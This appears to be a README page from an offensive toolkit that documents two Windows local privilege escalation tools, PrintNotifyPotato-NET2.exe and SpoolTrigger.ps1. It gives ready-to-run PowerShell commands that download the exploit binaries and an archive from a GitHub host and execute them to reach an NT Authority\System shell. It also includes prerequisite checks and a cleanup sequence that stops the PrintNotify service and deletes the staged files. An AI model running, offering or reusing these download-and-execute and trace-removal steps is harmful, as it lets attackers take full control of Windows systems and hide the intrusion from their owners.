## PrintNotifyPotato-NET2.exe

|Function name|Description|Privileges|Screenshot|
|---|---|---|---|
|PrintNotifyPotato-NET2|Local privilege escalation|Administrator|[PrintNotifyPotato](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/LPE.png)|

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/PrintNotifyPotato-NET2.exe" -OutFile "PrintNotifyPotato-NET2.exe"
```

<br />

**execute:**
```powershell
.\PrintNotifyPotato-NET2.exe whoami
.\PrintNotifyPotato-NET2.exe cmd interactive
```

<br />

## SpoolTrigger.ps1

|Function name|Description|Privileges|Screenshot|Credits|
|---|---|---|---|---|
|SpoolTrigger|Local privilege escalation|Administrator (from Admin to NT Authority\System)|[SpoolTrigger](https://user-images.githubusercontent.com/23490060/222120179-ae2e2b14-fe3e-453e-a494-dcf1c84dd270.jpg)|@404death|

<br />

<b><i>pre-requesites checks:</i></b>
```powershell
#Make sure PrintNotify service exists
[bool](Get-Service -Name "PrintNotify")

#Make sure System32\spool\drivers\x64\3 exists
[bool](Test-Path -Path "$Env:WINDIR\System32\spool\drivers\x64\3\")

#Make sure we have administrator privileges in shell
[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
```

<br />

**downloadcmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/LPE/bin.zip" -OutFile "$Env:TMP\bin.zip"
```

<br />

**execute:**
> **Warning**: Administrator privileges required to perform actions.
```powershell
# Expand ZIP archive
Expand-Archive -Path "$Env:TMP\bin.Zip" -DestinationPath "$Env:TMP" -Force
cd "$Env:TMP\bin"

# Move files to comrrespondent directory
Move-Item -Path "*" -Destination "$Env:WINDIR\System32\spool\drivers\x64\3\" -Force
cd "$Env:WINDIR\System32\spool\drivers\x64\3\bin"
.\SpoolTrigger.ps1

# Check privs
whoami

# CleanUp
Stop-Service -Name "PrintNotify" -Force
Remove-Item -Path "$Env:TMP\bin" -Force
Remove-Item -Path "$Env:TMP\bin.zip" -Force
Remove-Item -Path "$Env:WINDIR\System32\spool\drivers\x64\3\bin" -Force
```
